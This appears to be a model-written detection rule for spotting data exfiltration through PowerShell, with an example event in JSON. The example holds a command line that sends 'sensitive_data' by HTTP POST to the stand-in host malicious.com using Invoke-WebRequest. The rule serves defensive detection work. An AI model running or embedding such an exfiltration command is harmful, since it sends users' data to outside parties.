<output>
1. **Identify Data Exfiltration via PowerShell**  
   - Monitor for events where the `srcNode` is a PowerShell process (e.g., `powershell.exe` or `pwsh.exe`).  
   - Set the `relation` to "Process Create" for the PowerShell process.  
   - Ensure the `dstNode` is a network destination, specifically an external IP address or domain.  
   - Look for PowerShell command lines that include `Invoke-WebRequest` or `Invoke-RestMethod` to indicate data transmission.  
   - Example:  
     ```json
     {
       "srcNode": {
         "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
         "Cmdline": "powershell.exe -Command Invoke-WebRequest -Uri 'http://malicious.com/data' -Method POST -Body 'sensitive_data'",
         "Type": "Process"
       },
       "dstNode": {
         "Dstaddress": "malicious.com",
         "Type": "Network"
       },
       "relation": "Process Create"
     }
     ```
</output>